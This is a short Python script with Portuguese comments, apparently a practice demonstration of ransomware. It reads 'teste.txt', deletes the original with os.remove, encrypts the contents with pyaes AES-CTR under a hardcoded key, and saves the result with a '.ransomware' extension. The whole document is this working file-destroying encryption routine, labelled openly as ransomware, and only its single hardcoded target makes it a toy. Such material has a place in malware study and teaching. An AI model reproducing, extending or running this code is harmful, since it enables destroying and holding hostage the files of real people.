import os
import pyaes


## Abrindo arquivo que será criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Removendo arquivo original
os.remove(file_name)

## Definindo a chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModesOfOperationCTR(key)

## Criptografando o arquivo
crypto_data = aes.encrypt(file_data)

## Salvando arquivo criptografado
new_file = file_name + ".ransomware"
new_file = open(f"{new_file}", "wb")
new_file.write(crypto_data)
new_file.close()
